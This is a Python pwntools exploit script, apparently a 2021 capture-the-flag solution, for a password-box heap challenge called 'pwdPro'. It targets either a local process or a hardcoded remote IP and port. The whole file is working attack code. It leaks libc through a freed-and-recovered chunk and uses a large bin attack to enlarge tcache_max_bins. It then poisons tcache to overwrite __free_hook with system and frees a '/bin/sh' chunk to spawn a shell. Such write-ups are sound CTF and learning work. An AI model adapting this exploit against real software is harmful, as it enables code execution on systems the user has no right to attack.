# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './pwdPro'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '47.104.71.220'
    port = '38562'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla(':',num)

def add(idx,id,size,pwd):
    cmd(1)
    sla('Which PwdBox You Want Add:',idx)
    sla('Input The ID You Want Save:',id)
    sla('Length Of Your Pwd:',size)
    sa('Your Pwd:',pwd)

def delete(id):
    cmd(4)
    sla('Idx you want 2 Delete:',id)

def show(id):
    cmd(3)
    sla('Want Check:',id)

def edit(id,text):
    cmd(2)
    sla('Which PwdBox You Want Edit:',id)
    sleep(0.1)
    se(text)

def recovery(id):
    cmd(5)
    sla('Idx you want 2 Recover:',id)

def decode(payload):
    global key
    rst = ''
    for i in range(0, len(payload) , 8):
        rst += p64( u64 ( payload[i:i+8] ) ^ key)
    return rst

# 总结 如果知道 large bin attack 后续操作那将会是非常简单的一道题

add(0 ,'a', 0x528 , '\x00'*8 + '\n')
ru('Save ID:')
key = u64(p.recv(8))
lg('key',key)
add(1 ,'a', 0x500 , '\x00'*8 + '\n')
add(2 ,'a', 0x518 , '\x00'*8 + '\n')
add(3 ,'a', 0x500 , '\x00'*8 + '\n')
add(9 ,'a', 0x500 , '\x00'*8 + '\n')

delete(0)
recovery(0)
# dbg()
show(0)
ru('Pwd is: ')
leak = u64(p.recv(8)) ^ key 

__malloc_hook = leak - 0x70
global_max_fast = leak + 0x2fa0
libc.address = __malloc_hook - libc.sym['__malloc_hook']
tcache_max_bins = 0x1eb2d0 + libc.address
__free_hook = libc.sym['__free_hook']
system = libc.sym['system']

lg('tcache_max_bins',tcache_max_bins)

add(4 ,'a', 0x538 , '\x00'*8 + '\n')

delete(2)

show(0)
ru('Pwd is: ')
fd = u64(p.recv(8)) ^ key 
p.recv(8)
fdn = u64(p.recv(8)) ^ key 
lg('fd',fd)
lg('fdn',fdn)

fake = flat( fd , fd , fdn , tcache_max_bins - 0x20 )
edit(0 ,fake )

# 这里长见识了，原来有个 tcache_max_bins 这个东西存放了tcache最大数量
# 通过 large bin attack 可以改大让原本不属于 tcache 的堆块放入 tcache 从而完成 tcache 攻击
# 但是在这之后堆分布会被彻底破坏，调起来会有一点点麻烦

lg('libc.address',libc.address)
lg('__malloc_hook',__malloc_hook)
add(5 ,'a', 0x530 , '\x00'*8 + '\n')

delete(1)
delete(3)

recovery(3)
edit(3,p64(__free_hook))
add(6 , 'a' , 0x500 , '\n')
add(7 , 'a' , 0x500 , decode(p64(system)) + '\n')
edit(9 , '/bin/sh\x00')
delete(9)

# dbg()

p.interactive()

'''
@File    :   pwdFree.py
@Time    :   2021/08/21 20:08:21
@Author  :   Niyah 
'''